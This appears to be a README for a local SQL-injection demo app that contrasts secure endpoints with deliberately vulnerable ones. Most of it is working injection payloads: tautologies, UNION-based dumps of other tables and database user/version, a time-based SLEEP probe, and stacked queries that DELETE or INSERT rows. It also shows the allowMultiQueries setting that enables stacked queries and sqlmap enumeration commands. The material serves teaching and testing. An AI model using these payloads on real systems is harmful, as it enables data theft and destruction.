# Security Testing
## Update
- http://localhost:8086/security/update?id=c-1
## Single Query
- http://localhost:8086/security/query/single?id=c-1
## List Query
- http://localhost:8086/security/query/list?title=DEV

# Un-security Testing
## Update
- http://localhost:8086/un-security/update?id=c-1';INSERT INTO CUSTOMER(ID, NAME, TITLE) VALUES ('c-8','Roc','QA')-- ;[allowMultiQueries=true]
## Single Query
- http://localhost:8086/un-security/query/single?id=c-1' AND 'a'='a
- http://localhost:8086/un-security/query/single?id=c-1' OR 1=1 LIMIT 3,1-- ;
- http://localhost:8086/un-security/query/single?id=NOO' UNION SELECT * FROM PRODUCT limit 3,1-- ;
- http://localhost:8086/un-security/query/single?id=NOO' UNION SELECT DATABASE(), VERSION(), USER()-- ;
- http://localhost:8086/un-security/query/single?id=NOO' OR IF(1>0, SLEEP(10), 1)-- ;
## List Query
- http://localhost:8086/un-security/query/list?title=DEV' OR 'a'='a
- http://localhost:8086/un-security/query/list?title=DEV' ORDER BY 3 -- ;
- http://localhost:8086/un-security/query/list?title=NOO' LIMIT 0,100 -- ;
- http://localhost:8086/un-security/query/list?title=DEV' UNION SELECT * FROM PRODUCT-- ;
- http://localhost:8086/un-security/query/list?title=DEV';DELETE FROM CUSTOMER-- ;[allowMultiQueries=true]
- http://localhost:8086/un-security/query/list?title=DEV';INSERT INTO CUSTOMER(ID, NAME, TITLE) VALUES ('c-7','Ady','QA')-- ;[allowMultiQueries=true]
- http://localhost:8086/un-security/query/list?title=DEV';INSERT INTO PRODUCT(ID, NAME, TITLE) VALUES ('p-7','Vivo X200','Phone')-- ;[allowMultiQueries=true]

# How to execute multiple queries in a single statement in java
- spring.datasource.url=jdbc:mysql://host/database?allowMultiQueries=true

# SQLMAP
## Check if there is sql injection
- sqlmap -u http://localhost:8086/un-security/query/single?id=c-1
## Query users
- sqlmap -u http://localhost:8086/un-security/query/single?id=c-1 --users
## Query databases
- sqlmap -u http://localhost:8086/un-security/query/single?id=c-1 --dbs
## Query tables of a database
- sqlmap -u http://localhost:8086/un-security/query/single?id=c-1 -D <database> --tables
## Query columns of a table
- sqlmap -u http://localhost:8086/un-security/query/single?id=c-1 -D <database> -T <table> --columns
